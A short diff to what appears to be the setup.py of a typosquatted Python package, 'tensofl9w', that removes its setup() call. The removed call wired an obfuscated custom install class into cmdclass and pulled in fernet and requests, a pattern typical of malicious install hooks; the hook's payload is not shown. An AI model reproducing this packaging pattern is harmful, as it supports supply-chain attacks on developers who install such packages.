@@ -18,22 +18,5 @@ class DwrInQMkwjryEkJYZiePHYljaWViqzmTXdHJZbMjUpkCkYmIWedKWMACvoIytZqiAfMBoceYsY
             install.run(self)
 
 
-setup(
-    name="tensofl9w",
-    version=VERSION,
-    author="zukGulRP",
-    author_email="JKMWhhPYSIrGOPRx@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': DwrInQMkwjryEkJYZiePHYljaWViqzmTXdHJZbMjUpkCkYmIWedKWMACvoIytZqiAfMBoceYsYrRbssAGKiu,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
 
